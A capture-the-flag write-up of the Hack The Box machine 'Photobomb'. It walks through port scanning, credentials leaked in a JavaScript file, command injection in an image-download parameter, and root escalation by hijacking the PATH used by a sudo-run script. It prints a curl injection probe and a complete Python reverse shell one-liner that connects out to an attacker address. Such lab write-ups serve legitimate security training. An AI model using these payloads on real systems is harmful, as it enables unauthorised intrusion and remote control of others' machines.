# Hack-The-Box-writeups
Photobomb
1. Enumeration 
Let's start with a Nmap scan to discover services and open ports running on this machine.
nmap -sV -Sc 10.10.11.182
 ![image](https://user-images.githubusercontent.com/107045536/216795769-eacf443c-edec-451c-8de5-7842fe1cbb16.png)
There are only two open ports, port 22 and port 80 
- Web content and Subdomain enumeration don’t show anything  

2. Port 80 enumeration
photobomb.htb
 ![image](https://user-images.githubusercontent.com/107045536/216795779-e44da4f3-ff11-4552-a2a6-064c47d74f7a.png)
 
This link redirects to /printer which is asking for a username and password that we don’t know.
 ![image](https://user-images.githubusercontent.com/107045536/216795784-25623989-36b0-4b9b-8439-b98cc199a1b7.png)
 
Photobomb.htb source code 

 ![image](https://user-images.githubusercontent.com/107045536/216795788-83e10377-456b-4725-a7b4-91f901d9e78f.png)

Let's take a look at this JS file: 
![image](https://user-images.githubusercontent.com/107045536/216795793-e784324b-a978-4ced-a385-62579ce53b86.png)

Now let's log in with those credentials 
 ![image](https://user-images.githubusercontent.com/107045536/216795797-7d1aee88-10c2-4092-8db9-ace3991fdeac.png)

The website offers "DOWNLOAD PHOTO TO PRINT"
Let's intercept the request using Burpsuite  
 ![image](https://user-images.githubusercontent.com/107045536/216795804-dd8db109-55a5-4f52-a491-d23078e0fce1.png)

It seems vulnerable to command injection
Let's test for command injection, start "python web server" 
1. python3 -m http.server
2. inject ;curl+10.10.x.x:8000 to each parameter 
 ![image](https://user-images.githubusercontent.com/107045536/216795809-501793d1-c82c-40a0-8bab-86d329a11bf9.png)
We found that only the filetype parameter is vulnerable 
Lets create some reverse shell: https://www.revshells.com/ 
export+RHOST="10.10.14.34";export+RPORT=5555;python3+-c+'import+sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)];pty.spawn("sh")'

Start the Netcat listener 
![image](https://user-images.githubusercontent.com/107045536/216795815-f88dbd93-f881-49b4-b084-f2bfacede87a.png)
![image](https://user-images.githubusercontent.com/107045536/216795821-274fe779-ae03-4388-a34e-74cd087113c3.png)

3. Privilege Escalation

Lets upgrade our shell 
export TERM=xterm
python3 -c 'import pty;pty.spawn("/bin/bash")'

Before running linpeas lets try the classic ways 
 ![image](https://user-images.githubusercontent.com/107045536/216795825-bc62f6e6-98a7-4f70-acec-4ca50402d139.png)

User wizard can run "cleanup.sh" with "sudo" privilege 



Lets check this script
 ![image](https://user-images.githubusercontent.com/107045536/216795830-dee8d555-5cd8-4bf4-9142-82fc036a8cf2.png)

So there are two interesting, “cd” and "find" called without their absolute path. so, we can exploit this misconfiguration by changing the "PATH variable"   
Lets create "cd" file that contains '/bin/bash'  and give 777 permission
 ![image](https://user-images.githubusercontent.com/107045536/216795832-47d85810-fd6b-44af-a32c-02d770ad60c7.png)

Add /tmp to the beginning of the PATH variable 
 ![image](https://user-images.githubusercontent.com/107045536/216795835-38437609-6b9d-415c-b709-ff9a7d0c9569.png)
![image](https://user-images.githubusercontent.com/107045536/216795840-455f1338-9933-4c2c-9a39-3554b565b9a9.png)




